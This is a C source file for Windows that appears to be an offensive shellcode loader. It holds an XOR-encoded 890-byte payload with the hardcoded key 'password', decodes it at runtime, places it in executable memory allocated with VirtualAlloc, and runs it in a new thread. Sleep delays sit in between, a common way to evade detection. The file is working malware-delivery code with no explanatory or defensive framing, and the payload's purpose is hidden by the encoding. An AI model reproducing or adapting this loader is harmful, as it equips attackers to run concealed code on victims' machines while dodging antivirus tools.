#include <windows.h>
#include <stdio.h>
#include <tchar.h>

void _tmain(int argc, TCHAR* argv[])
{
    /* length: 890 bytes */
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));
    Sleep(1000);
    //decoding payload function
    unsigned char buf[] = "\x8c\x89\xfc\x73\x77\x6f\x12\xed\xe5\x41\xb3\x17\xf8\x25\x5f\xf9\x36\xc\xfb\x33\x67\xf8\x5\x47\x43\x9b\xf\xc7\x2b\x55\x42\xb7\xc3\x4e\x5\x7c\x72\x4d\x53\xb2\xb8\x62\x73\xa3\x49\x5\x8e\x21\x24\xfc\x3d\x62\xef\x42\x4c\x60\xa3\xf8\x37\x17\xf7\xa4\x74\x3c\x60\xa3\x23\xfc\x37\x52\xef\x48\x68\x60\xa0\xf6\xbe\x1b\x4e\x2d\x31\x8f\xea\x47\xf8\x76\xb9\x43\xa4\xc1\xbf\x6c\xdf\x72\xb0\x57\x92\x11\xf4\x73\x1c\x8b\x48\xa\x4b\x7\x84\x58\xfb\x39\x57\x72\xa4\x9\xf9\x68\x4b\xfb\x39\x6f\x72\xa4\xe4\x76\xef\x1\xa0\xe8\x37\x57\x53\x34\x29\x5\x59\x2a\x30\x8c\x93\x2f\x30\x28\xef\x12\x99\xe1\x8c\x8c\x88\x32\x1a\x57\x32\x70\x61\x1b\x4\x4\x5d\x2d\x30\x68\x3c\x16\x55\x74\xfe\x87\x8d\xb4\xb8\xe0\x60\x73\x73\x5e\xab\x26\x34\x68\x59\xe1\x18\x73\x88\xba\x18\x6e\x68\xdc\x71\x72\x64\x1f\x6d\x72\x43\xf\xf9\x87\x23\x23\x27\x3f\x32\x34\x40\x20\x9\x99\x7c\xa8\x8f\x8d\xb1\x97\x1a\x71\x25\x24\x1f\xf6\xd7\x10\x61\x8f\xb4\xf6\xb3\x3\x65\x8d\x2a\x8\x5\x8d\x9b\x14\x77\x6f\x72\xe\x0\x1a\x65\x25\x24\x1f\x6d\xab\xac\x5f\x8f\xb4\xf0\x8b\x77\x11\x44\xef\x36\x1a\x21\x1b\x73\x67\x6f\x72\x32\x6a\x70\x9\x2b\xd7\x24\x8a\x8d\xb1\x93\x23\xb\x73\x25\x24\x38\x1a\x66\xd9\xb8\x3e\x8c\xa6\xf4\x97\x72\x19\x28\x28\x9\x73\x33\x77\x6f\x18\x64\x50\x18\x6a\x5c\x7c\x47\x90\xa7\x33\x68\x5\xf\x3e\x12\x88\xba\x2c\x3a\xff\x7c\x45\x7c\xf6\x7\x90\x8d\x9b\xe9\xeb\x9e\x8c\x8c\x76\xac\x5b\xa2\x75\xb1\xa2\xc8\x83\xc2\xcd\x24\xe\x0\x23\x9e\xa6\x73";


    int buf_len = sizeof(buf);
    //printf("Size of payload is: %d\n", payload_len);
    unsigned char key[] = "password";
    unsigned int key_len = sizeof(key);
    unsigned int position;
    unsigned int result;

    Sleep(1000);

    for (int i = 0; i < buf_len; i++) {
        position = i % key_len;
        //printf("key position is %d\n", position);
        result = buf[i] ^ key[position];
        buf[i] = result;
        //printf("result is %x\n", result);

    }

    for (int i = 0; i < buf_len; i++) {
        printf("\\x%x", buf[i]);
    }



    // Alloc memory
    LPVOID addressPointer = VirtualAlloc(NULL, sizeof(buf), 0x3000, 0x40);

    // Copy shellcode
    RtlMoveMemory(addressPointer, buf, sizeof(buf));

    // Create thread pointing to shellcode address
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)addressPointer, NULL, 0, 0);

    // Sleep for a second to wait for the thread
    Sleep(1000);



}